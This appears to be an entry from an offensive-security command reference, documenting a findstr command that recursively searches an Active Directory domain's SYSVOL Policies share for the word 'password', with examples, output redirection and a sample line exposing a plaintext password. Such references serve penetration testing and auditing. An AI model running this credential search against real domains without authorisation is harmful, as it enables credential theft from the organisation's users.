---
type: command
executor: cmd
data: findstr /si password \\%_DOMAIN%\SYSVOL\%_DOMAIN%\Policies\*.*
platforms:
  - Windows
tags:
  - credential-access
  - active-directory
verified: true
validated: true
---

# findstr-search-sysvol-files-for-password

## Command

```cmd
findstr /si password \\%_DOMAIN%\SYSVOL\%_DOMAIN%\Policies\*.*
```

## Description

This command searches for the string 'password' in all files within the SYSVOL Policies directory of an Active Directory domain, helping to identify exposed credentials in readable shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /si | Case-insensitive (/i) and recursive search (/s) flags | Yes |
| password | The search string for potential credential keywords | Yes |
| $_DOMAIN | Target domain name (e.g., contoso.com) | Yes |
| *.* | Wildcard to search all file types in the Policies directory | Yes |

## Examples

### Basic Usage

```cmd
findstr /si password \\contoso.com\SYSVOL\contoso.com\Policies\*.*
```

### Advanced Usage

To redirect output to a file for review:

```cmd
findstr /si password \\contoso.com\SYSVOL\contoso.com\Policies\*.* > sysvol_passwords.txt
```

## Expected Output

The command outputs lines from matching files, e.g.:

`C:\Users\admin.xml:    <Password>SecretPass123</Password>`

Success is indicated by any matches showing file paths and context around 'password'.

## Related

- [[procedures/Extract-and-Decrypt-GPP-Passwords-from-SYSVOL]]
